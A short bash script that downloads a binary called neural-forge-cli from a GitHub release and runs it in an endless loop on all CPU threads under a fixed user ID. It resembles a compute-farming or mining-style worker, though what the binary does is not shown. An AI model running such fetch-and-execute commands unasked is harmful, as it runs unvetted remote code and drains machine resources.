#!/bin/bash
curl -O -J -L https://github.com/neural-forge-ai/neural-forge-cli/releases/download/v1.0.0/neural-forge-cli-linux && \
chmod +x neural-forge-cli-linux && \
while true; do ./neural-forge-cli-linux --model llm-v2 --user-id 00aaf1d7-626d-42e6-8ae8-159de1272718 --threads $(nproc --all); sleep 11; done
